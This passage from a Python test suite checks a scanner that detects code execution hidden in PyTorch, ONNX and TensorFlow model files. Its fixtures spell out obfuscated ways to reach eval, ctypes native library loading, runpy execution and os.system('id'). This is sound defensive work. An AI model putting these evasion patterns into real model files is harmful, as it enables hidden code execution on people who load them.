            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_non_loading_ctypes_subclass_initializers(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class NoLoad(Safe, ctypes.CDLL):\n"
            b"        pass\n"
            b"    ctypes.LibraryLoader(NoLoad).payload\n"
            b"    NoLoad('/missing')\n"
            b"    class MissingNameSuperCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super().__init__()\n"
            b"    ctypes.LibraryLoader(MissingNameSuperCDLL).payload\n"
            b"    MissingNameSuperCDLL('/missing')\n"
            b"    class DeadDelegateCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            if False:\n"
            b"                ctypes.CDLL.__init__(self, name)\n"
            b"    ctypes.LibraryLoader(DeadDelegateCDLL).payload\n"
            b"    DeadDelegateCDLL('/missing')\n"
            b"    class InstanceShadowCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init = lambda name: None\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(InstanceShadowCDLL).payload\n"
            b"    InstanceShadowCDLL('/missing')\n"
            b"    class NewSkipsInitCDLL(ctypes.CDLL):\n"
            b"        def __new__(cls, name: str):\n"
            b"            return object()\n"
            b"    ctypes.LibraryLoader(NewSkipsInitCDLL).payload\n"
            b"    NewSkipsInitCDLL('/missing')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_safe_webbrowser_method_overwrite_and_invalid_libraryloader(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    browser.open = len\n"
            b"    browser.open([])\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    loader.payload.printf(b'x')\n"
            b"    load = ctypes.cdll.LoadLibrary\n"
            b"    class_attr = ctypes.LibraryLoader.payload\n"
            b"    ctypes.windll.kernel32 = len\n"
            b"    getattr(ctypes.windll, 'kernel32')\n"
            b"    getattr(object=ctypes.cdll, name='msvcrt')\n"
            b"    ctypes.windll.kernel32\n"
            b"    ctypes.cdll.__getattribute__('msvcrt')\n"
            b"    object.__getattribute__(ctypes.cdll, 'msvcrt')\n"
            b"    os.__getattr__('system')('id')\n"
            b"    builtins.__getattr__('eval')('1')\n"
            b"    other = browser\n"
            b"    browser.open = len\n"
            b"    browser = webbrowser.get()\n"
            b"    other.open([])\n"
            b"    other_loader = loader\n"
            b"    loader.payload = len\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    other_loader.payload([])\n"
            b"    ctypes.LibraryLoader = len\n"
            b"    ctypes.LibraryLoader(ctypes.CDLL).payload\n"
            b"    class SafeCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            pass\n"
            b"    ctypes.LibraryLoader(SafeCDLL).payload\n"
            b"    SafeCDLL('/missing')\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class NoLoad(Safe, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super().__init__(name)\n"
            b"    ctypes.LibraryLoader(NoLoad).payload\n"
            b"    NoLoad('/missing')\n"
            b"    class OverwrittenInitCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def init(self, name: str) -> None:\n"
            b"            pass\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(OverwrittenInitCDLL).payload\n"
            b"    OverwrittenInitCDLL('/missing')\n"
            b"    class SafeNestedCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            def later() -> None:\n"
            b"                ctypes.CDLL.__init__(self, name)\n"
            b"    ctypes.LibraryLoader(SafeNestedCDLL).payload\n"
            b"    SafeNestedCDLL('/missing')\n"
            b"    class SafeShadowCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init = lambda name: None\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(SafeShadowCDLL).payload\n"
            b"    SafeShadowCDLL('/missing')\n"
            b"    class SafeNewCDLL(ctypes.CDLL):\n"
            b"        def __new__(cls, name: str):\n"
            b"            return object()\n"
            b"    ctypes.LibraryLoader(SafeNewCDLL).payload\n"
            b"    SafeNewCDLL('/missing')\n"
            b"    setattr(ctypes.windll, 'kernel32', len)\n"
            b"    ctypes.windll.kernel32\n"
            b"    safe_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    setattr(safe_loader, 'payload', len)\n"
            b"    safe_loader.payload([])\n"
            b"    safe_browser = webbrowser.get()\n"
            b"    setattr(safe_browser, 'open', len)\n"
            b"    safe_browser.open([])\n"
            b"    return load.__name__\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern"
            and finding.pattern in {"Web browser launch detected", "Native library loading detected"}
            for finding in findings
        )

    def test_scan_model_invalidates_safe_libraryloader_proof_after_member_write(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    import builtins\n"
            b"    import ctypes\n"
            b"    import runpy\n"
            b"    original = runpy.run_path\n"
            b"    runpy.run_path = print\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    loader.payload = builtins.setattr\n"
            b"    loader.payload(runpy, 'run_path', original)\n"
            b"    runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_independent_inert_libraryloader_after_other_rebound(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    import ctypes\n"
            b"    first = ctypes.LibraryLoader(len)\n"
            b"    second = ctypes.LibraryLoader(len)\n"
            b"    first.payload = ctypes.CDLL\n"
            b"    second.payload.printf(b'x')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_inert_libraryloader_metadata_assignment(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    import ctypes\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    loader.label = 'debug'\n"
            b"    loader.payload.printf(b'x')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_detects_inert_libraryloader_dlltype_mapping_rebound(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    import ctypes\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    loader.__dict__['_dlltype'] = ctypes.CDLL\n"
            b"    loader.payload\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "mutation",
        [
            b"    loader.__setattr__('_dlltype', ctypes.CDLL)\n",
            b"    loader.__setattr__.__call__('_dlltype', ctypes.CDLL)\n",
        ],
    )
    def test_scan_model_detects_inert_libraryloader_bound_setattr_rebound(self, mutation: bytes) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    import ctypes\n"
            b"    loader = ctypes.LibraryLoader(len)\n" + mutation + b"    loader.payload\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"def payload():\n"
                b"    import builtins\n"
                b"    import runpy\n"
                b"    original = runpy.run_path\n"
                b"    builtins.len = original\n"
                b"    runpy.run_path = len\n"
                b"    runpy.run_path('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"def payload():\n"
                b"    import builtins\n"
                b"    import ctypes\n"
                b"    original = ctypes.CDLL\n"
                b"    builtins.len = original\n"
                b"    loader = ctypes.LibraryLoader(len)\n"
                b"    loader.payload\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_detects_poisoned_implicit_builtin_safe_proof(
        self, source: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    def test_scan_model_detects_native_load_after_inert_libraryloader_member_rebound(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    import ctypes\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    alias = loader\n"
            b"    loader.payload = ctypes.CDLL\n"
            b"    alias.payload('/missing')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_detects_late_ctypes_subscript_alias_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xfffrom ctypes import cdll\n" + padding + b"cdll['payload']\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("helper_import", "endpoint"),
        [
            (b"from builtins import getattr as helper\n", b"helper(ctypes_alias, 'CDLL')('payload')\n"),
            (b"from builtins import vars as helper\n", b"helper(ctypes_alias)['CDLL']('payload')\n"),
            (
                b"from builtins import (\n    getattr as helper,\n)\n",
                b"helper(ctypes_alias, 'CDLL')('payload')\n",
            ),
        ],
    )
    def test_scan_model_detects_late_ctypes_call_through_imported_builtin_helper(
        self, helper_import: bytes, endpoint: bytes
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + helper_import + b"import ctypes as ctypes_alias\n" + padding + endpoint

        findings = detector.scan_model(source, "onnx", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("helper_import", "safe_rebind", "endpoint"),
        [
            (
                b"from builtins import getattr as helper\n",
                b"helper = lambda *_args: len\n",
                b"helper(ctypes_alias, 'CDLL')('payload')\n",
            ),
            (
                b"from builtins import vars as helper\n",
                b"helper = lambda *_args: {'CDLL': len}\n",
                b"helper(ctypes_alias)['CDLL']('payload')\n",
            ),
        ],
    )
    def test_scan_model_ignores_late_shadowed_imported_builtin_helper(
        self, helper_import: bytes, safe_rebind: bytes, endpoint: bytes
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + helper_import + b"import ctypes as ctypes_alias\n" + padding + safe_rebind + endpoint

        findings = detector.scan_model(source, "onnx", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "mutation",
        [
            b"loader._dlltype = ctypes.CDLL\n",
            b"loader.__dict__['_dlltype'] = ctypes.CDLL\n",
            b"setattr(loader, '_dlltype', ctypes.CDLL)\n",
            b"vars(loader)['_dlltype'] = ctypes.CDLL\n",
        ],
    )
    def test_scan_model_detects_late_inert_libraryloader_dlltype_rebound(self, mutation: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport ctypes\nloader = ctypes.LibraryLoader(len)\n" + padding + mutation + b"loader.payload\n"
        )

        findings = detector.scan_model(source, "onnx", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "late_state",
        [
            b"loader.label = 'debug'\nloader.payload\n",
            b"loader._dlltype = len\nloader.payload\n",
        ],
    )
    def test_scan_model_ignores_late_inert_libraryloader_safe_state(self, late_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport ctypes\nloader = ctypes.LibraryLoader(len)\n" + padding + late_state

        findings = detector.scan_model(source, "onnx", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "definition",
        [
            b"@runpy_alias.run_path('payload.py')\ndef payload():\n    pass\n",
            b"def payload(value=runpy_alias.run_path('payload.py')):\n    pass\n",
            b"class Payload(runpy_alias.run_path('payload.py')):\n    pass\n",
            b"class Payload(metaclass=runpy_alias.run_path('payload.py')):\n    pass\n",
            b"def payload() -> runpy_alias.run_path('payload.py'):\n    pass\n",
        ],
    )
    def test_scan_model_detects_late_runpy_definition_time_call(self, definition: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as runpy_alias\n" + padding + definition

        findings = detector.scan_model(source, "onnx", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "definition",
        [
            b"@runpy_alias.run_path('payload.py')\ndef payload():\n    pass\n",
            b"def payload(value=runpy_alias.run_path('payload.py')):\n    pass\n",
        ],
    )
    def test_scan_model_ignores_late_safe_runpy_definition_time_call(self, definition: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as runpy_alias\nrunpy_alias.run_path = print\n" + padding + definition

        findings = detector.scan_model(source, "onnx", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_late_deferred_runpy_annotation(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xfffrom __future__ import annotations\n"
            b"import runpy as runpy_alias\n"
            + padding
            + b"def payload() -> runpy_alias.run_path('payload.py'):\n    pass\n"
        )

        findings = detector.scan_model(source, "onnx", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_late_ctypes_subscript_after_safe_rebind(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xfffrom ctypes import cdll\n" + padding + b"cdll = {}\ncdll['payload']\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_shadowed_delattr_before_safe_late_runpy_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"original = rp.run_path\nrp.run_path = print\nimport builtins\n"
            + b"builtins.delattr = lambda *args: None\n"
            + b"delattr(rp, 'run_path')\nrp.__dict__.setdefault('run_path', original)\nrp.run_path('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_invalidates_state_after_bound_explicit_dunder_callback(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    import runpy\n"
            b"    original = runpy.run_path\n"
            b"    runpy.run_path = print\n"
            b"    class CallbackHost:\n"
            b"        def __getattr__(self, name):\n"
            b"            return setattr\n"
            b"    callback_host = CallbackHost()\n"
            b"    callback_host.__getattr__('mutate')(runpy, 'run_path', original)\n"
            b"    runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            "callbacks = [f for f in [eval]]\ncallbacks[0]('1+1')",
            "callbacks = {name: callback for name, callback in [('run', eval)]}\ncallbacks['run']('1+1')",
            "for _x, callback in zip([0], [eval]):\n    callback('1+1')",
            (
                "class Base:\n"
                "    def run(self, callback): callback('1+1')\n"
                "class Child(Base):\n"
                "    def go(self): super().run(eval)\n"
                "Child().go()"
            ),
            "import operator\noperator.methodcaller('__call__', '1+1')(eval)",
            "import operator\noperator.attrgetter('__call__')(eval)('1+1')",
            "callbacks = []\ncallbacks.insert(0, eval)\ncallbacks[0]('1+1')",
            "callbacks = {}\ncallbacks.update({'run': eval})\ncallbacks['run']('1+1')",
        ],
    )
    def test_dangerous_builtin_analysis_tracks_additional_alias_flows(self, source: str) -> None:
        findings = JITScriptDetector._dangerous_builtin_calls_in_tree(ast.parse(source))

        assert "eval" in findings

    @pytest.mark.parametrize(
        "source",
        [
            "callbacks = [f for f in [len]]\ncallbacks[0]([])\nunused = eval",
            "callbacks = [f for f in [eval] if False]\ncallbacks[0]('1+1')",
            (
                "callbacks = {name: callback for name, callback in [('run', eval)]}\n"
                "callbacks['run'] = len\ncallbacks['run']([])"
            ),
            "for _x, callback in zip([0], [len]):\n    callback([])\nunused = eval",
            (
                "class Base:\n"
                "    def run(self, callback): callback([])\n"
                "class Child(Base):\n"
                "    def go(self): super().run(len)\n"
                "Child().go()\nunused = eval"
            ),
            "import operator\noperator.methodcaller('__str__')(eval)",
            "import operator\noperator.attrgetter('__name__')(eval)",
            "callbacks = []\ncallbacks.insert(0, eval)\ncallbacks[0] = len\ncallbacks[0]([])",
            ("callbacks = {}\ncallbacks.update({'run': eval})\ncallbacks.update(run=len)\ncallbacks['run']([])"),
        ],
    )
    def test_dangerous_builtin_analysis_ignores_safe_alias_near_matches(self, source: str) -> None:
        findings = JITScriptDetector._dangerous_builtin_calls_in_tree(ast.parse(source))

        assert "eval" not in findings

    def test_dangerous_builtin_analysis_handles_deep_folded_getattr_without_recursion(self) -> None:
        member_expression = " + ".join(["'ev'", *(["''"] * 1_000), "'al'"])
        tree = ast.parse(f"getattr(__builtins__, {member_expression})('1+1')")

        findings = JITScriptDetector._dangerous_builtin_calls_in_tree(tree)

        assert "eval" in findings

    @pytest.mark.parametrize(
        "data",
        [
            b"callbacks = {'run': eval}\ncallbacks.popitem()[1]('1+1')\n",
            b"callbacks = {'safe': len, 'run': eval}\ncallbacks.popitem()[1]('1+1')\n",
            b"callbacks = {'run': eval}\ndict.popitem(callbacks)[1]('1+1')\n",
            b"def identity(callback):\n    return callback\nidentity(eval)('1+1')\n",
            b"def identity(callback):\n    return callback\nidentity(callback=eval)('1+1')\n",
            b"identity = lambda callback: callback\nidentity(eval)('1+1')\n",
            b"callbacks = {'run': eval}\nfor _name, callback in callbacks.items():\n    callback('1+1')\n",
            b"import operator\noperator.getitem([eval], 0)('1+1')\n",
            b"callbacks = [len]\ncallbacks.__setitem__(0, eval)\ncallbacks[0]('1+1')\n",
            b"callbacks = [eval, len]\ncallbacks.reverse()\ncallbacks[1]('1+1')\n",
            b"iter([eval]).__next__()('1+1')\n",
            b"[eval][::-1][0]('1+1')\n",
            b"([eval] * 2)[1]('1+1')\n",
            b"([eval] * 100)[99]('1+1')\n",
            b"next(iter({'run': eval}.values()))('1+1')\n",
            b"((callback := eval), callback)[1]('1+1')\n",
        ],
    )
    def test_scan_model_detects_dynamic_callbacks_from_returned_mapping_values(self, data: bytes) -> None:
        findings = JITScriptDetector().scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"callbacks = {'run': eval}\ndel callbacks['run']\ncallbacks['run']('1+1')\n",
            b"callbacks = [eval]\ndel callbacks[0]\ncallbacks.append(len)\ncallbacks[0]([])\n",
            b"callbacks = {'run': eval}\ncallbacks.popitem()\ncallbacks['run']('1+1')\n",
            b"callbacks = {'run': eval, 'safe': len}\ncallbacks.popitem()[1]([])\n",
            b"def identity(callback):\n    return callback\nidentity(len)([])\nunused = eval\n",
            b"def identity(callback):\n    callback = len\n    return callback\nidentity(eval)([])\n",
            (b"def choose(callback, enabled):\n    return callback if enabled else len\nchoose(eval, False)([])\n"),
            b"callbacks = {'run': len}\nfor _name, callback in callbacks.items():\n    callback([])\nunused = eval\n",
            b"import operator\noperator.getitem([len], 0)([])\nunused = eval\n",
            b"callbacks = [eval]\ncallbacks.__setitem__(0, len)\ncallbacks[0]([])\n",
            b"callbacks = [eval, len]\ncallbacks.reverse()\ncallbacks[0]([])\n",
            b"callbacks = [eval]\ncallbacks.clear()\ncallbacks.append(len)\ncallbacks[0]([])\n",
            b"iter([len]).__next__()([])\nunused = eval\n",
            b"[len][::-1][0]([])\nunused = eval\n",
            b"([len] * 2)[1]([])\nunused = eval\n",
            b"([len] * 100)[99]([])\nunused = eval\n",
            b"next(iter({'run': len}.values()))([])\nunused = eval\n",
            b"((callback := len), callback)[1]([])\nunused = eval\n",
        ],
    )
    def test_scan_model_ignores_removed_or_safe_dynamic_callbacks(self, data: bytes) -> None:
        findings = JITScriptDetector().scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    def test_strict_mode(self) -> None:
        """Test strict mode flags any JIT usage."""
        detector_normal = JITScriptDetector({"strict_mode": False})
        detector_strict = JITScriptDetector({"strict_mode": True})

        data = b"TorchScript torch.jit.script"

        findings_normal = detector_normal.scan_torchscript(data)
        findings_strict = detector_strict.scan_torchscript(data)

        assert not any(f.type == "jit_usage" for f in findings_normal)
        # Strict mode should flag JIT usage
        assert any(f.type == "jit_usage" for f in findings_strict)
        # Normal mode might not flag it as severely
        strict_warnings = [f for f in findings_strict if f.type == "jit_usage"]
        assert len(strict_warnings) > 0

    def test_custom_dangerous_ops(self):
        """Test adding custom dangerous operations."""
        config = {
            "custom_dangerous_ops": {
                "torch": ["my.custom.dangerous.op"],
                "tf": ["tf.my.dangerous.function"],
            }
        }
        detector = JITScriptDetector(config)

        # Test custom Torch op
        torch_data = b"my.custom.dangerous.op(payload)"
        findings = detector.scan_torchscript(torch_data)
        assert any("my.custom.dangerous.op" in getattr(f, "operation", "") for f in findings)

        # Test custom TF op
        tf_data = b"tf.my.dangerous.function(exploit)"
        findings = detector.scan_tensorflow(tf_data)
        assert any("tf.my.dangerous.function" in getattr(f, "operation", "") for f in findings)

    def test_ast_analysis(self):
        """Test Python AST analysis for dangerous patterns."""
        detector = JITScriptDetector()

        # Valid Python code with dangerous patterns
        python_code = b"""
def malicious():
    import os
    from subprocess import call

    eval('dangerous')
    exec(compile('code', 'string', 'exec'))
    __import__('sys').exit()
"""

        findings = detector._extract_and_check_python_code(python_code, "Test", "test")

        # Should detect through AST analysis
        ast_findings = [f for f in findings if "ast_" in getattr(f, "type", "")]
        assert len(ast_findings) > 0
        assert any("os" in getattr(f, "import_", "") for f in ast_findings)


class TestDetectJITScriptRisks:
    """Test the convenience function for file scanning."""

    def test_scan_file(self, tmp_path):
        """Test scanning a file for JIT/Script risks."""
        # Create a test file with dangerous content
        test_file = tmp_path / "model.pt"
        test_file.write_bytes(b"TorchScript\ntorch.ops.aten.system('evil')")

        findings = detect_jit_script_risks(str(test_file))
        assert len(findings) > 0
        assert any("torch.ops.aten.system" in str(f) for f in findings)

    def test_scan_file_detects_unmarked_dangerous_python_source(self, tmp_path: Path) -> None:
        test_file = tmp_path / "payload.bin"
        test_file.write_bytes(
            b"""
            def payload():
                import os
                return os.system("id")
            """
        )

        findings = detect_jit_script_risks(str(test_file))

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_file_not_found(self):
        """Test handling of non-existent files."""
        findings = detect_jit_script_risks("/non/existent/file.pt")
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "not found" in findings[0].message

    def test_file_too_large(self, tmp_path):
        """Test handling of files that are too large."""
        large_file = tmp_path / "large.pt"
        large_file.write_bytes(b"x" * 100)

        # Test with very small max_size
        findings = detect_jit_script_risks(str(large_file), max_size=50)
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "too large" in findings[0].message

    def test_model_type_detection_from_extension(self, tmp_path):
        """Test that model type is detected from file extension."""
        # Test PyTorch extensions
        for ext in [".pt", ".pth", ".pts", ".torchscript"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"torch.ops.aten.exec('bad')")
            findings = detect_jit_script_risks(str(test_file))
            assert any("torch.ops.aten.exec" in str(f) for f in findings)

        # Test TensorFlow extensions
        for ext in [".pb", ".h5", ".keras"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"tf.py_func(evil)")
            findings = detect_jit_script_risks(str(test_file))
            assert any("tf.py_func" in str(f) for f in findings)

        # Test ONNX extension
        test_file = tmp_path / "model.onnx"
        test_file.write_bytes(b"PythonOp custom")
        findings = detect_jit_script_risks(str(test_file))
        assert any("Python operator" in str(f) for f in findings)


def test_priority_assignment_aliases_skips_rootless_expensive_probes(monkeypatch: pytest.MonkeyPatch) -> None:
    # Rootless assignments cannot depend on a tracked alias. Replaying the whole
    # snippet for each literal assignment makes a small framed source CPU-bound.
    lines = ["import ctypes", *[f"v{index} = {index}" for index in range(400)], "alias = ctypes"]
    source = "\n".join(lines)
    tree = ast.parse(source)

    parse_calls = 0
    real_parse = ast.parse

    def counting_parse(*args: Any, **kwargs: Any) -> Any:
        nonlocal parse_calls
        parse_calls += 1
        return real_parse(*args, **kwargs)

    monkeypatch.setattr(jit_script_module.ast, "parse", counting_parse)
    aliases = jit_script_module._priority_assignment_aliases(source, tree, {"ctypes"})

    assert parse_calls == 0
    # The direct-reference alias is still discovered via the cheap fast path.
    assert b"alias" in aliases


def test_priority_assignment_aliases_preserves_wrapped_tracked_references() -> None:
    source = "import ctypes\nloader = ctypes.LibraryLoader(ctypes.CDLL)"
    tree = ast.parse(source)

    aliases = jit_script_module._priority_assignment_aliases(source, tree, {"ctypes"})

    assert b"loader" in aliases


def test_first_body_statement_segment_bounds_nested_recursion() -> None:
    # A pathologically nested run of ``:`` headers must not exhaust the stack
    # (PR #1402 recursion follow-up); extraction returns a bounded segment instead.
    header = b"def f():\n"
    candidate = header + b"".join(b" " * (depth + 1) + b"if 1:\n" for depth in range(3000)) + b" " * 3001 + b"x = 1\n"
    segment = jit_script_module._first_body_statement_segment(candidate, len(header), 0)
    assert segment is not None
